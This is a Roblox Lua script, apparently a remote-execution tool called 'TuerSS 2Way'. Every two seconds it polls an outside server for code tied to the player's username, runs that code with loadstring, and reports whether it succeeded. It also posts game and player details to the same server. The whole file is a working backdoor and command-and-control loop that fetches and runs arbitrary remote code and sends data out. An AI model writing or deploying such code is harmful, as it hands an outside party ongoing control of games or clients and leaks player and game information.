-- SoriaDora: TuerSS 2Way Execute Script with Game Logging
-- This script checks for new scripts to execute every 2 seconds,
-- retrieves a script from the API endpoint based on the Roblox player's username,
-- executes it, and sends feedback to the server whether it was successful or not.
-- Additionally, it logs game information to the server every 2 seconds.

-- Function to send POST feedback to the server
function sendFeedback(username, status)
    local httpService = game:GetService("HttpService")
    local feedbackUrl = "https://tuerss.com/api/executes/" .. username .. "/feedback"
    local data = {
        message = status -- Either "executed successfully" or "failed to execute"
    }

    local jsonData = httpService:JSONEncode(data)
    local success, response = pcall(function()
        return httpService:PostAsync(feedbackUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Feedback sent: " .. status)
    else
        print("Failed to send feedback: " .. response)
    end
end

-- Function to fetch and execute the script
function checkAndExecute(username)
    local httpService = game:GetService("HttpService")
    local executeUrl = "https://tuerss.com/api/executes/" .. username

    local success, scriptContent = pcall(function()
        return httpService:GetAsync(executeUrl)
    end)

    if success and scriptContent and scriptContent ~= "-- nothing here" then
        local executeSuccess, errorMessage = pcall(function()
            loadstring(scriptContent)()
        end)

        if executeSuccess then
            sendFeedback(username, "executed successfully")
        else
            sendFeedback(username, "failed to execute: " .. errorMessage)
        end
    else
        print("No script to execute or failed to fetch script")
    end
end

-- Function to log game information to the server
function logGameInfo(username)
    local httpService = game:GetService("HttpService")
    local gameLogUrl = "https://tuerss.com/api/gamelog"

    -- Collecting game information
    local gameInfo = {
        gameId = tostring(game.GameId), -- The unique ID of the game
        gameName = game.Name, -- The name of the game
        description = game.Description, -- The description of the game
        creator = game.Creator.Name, -- The name of the game's creator
        playerCount = #game.Players:GetPlayers(), -- Current number of players in the game
        maxPlayers = game.Players.MaxPlayers, -- Maximum number of players allowed
        username = username -- Roblox player's username
    }

    local jsonData = httpService:JSONEncode(gameInfo)
    local success, response = pcall(function()
        return httpService:PostAsync(gameLogUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Game log sent successfully")
    else
        print("Failed to send game log: " .. response)
    end
end

-- Main loop to check for new scripts and log game info every 2 seconds
local username = game.Players.LocalPlayer.Name
while true do
    checkAndExecute(username) -- Check and execute script for the player
    logGameInfo(username) -- Log game information to the server
    wait(2) -- Wait for 2 seconds before the next check
end
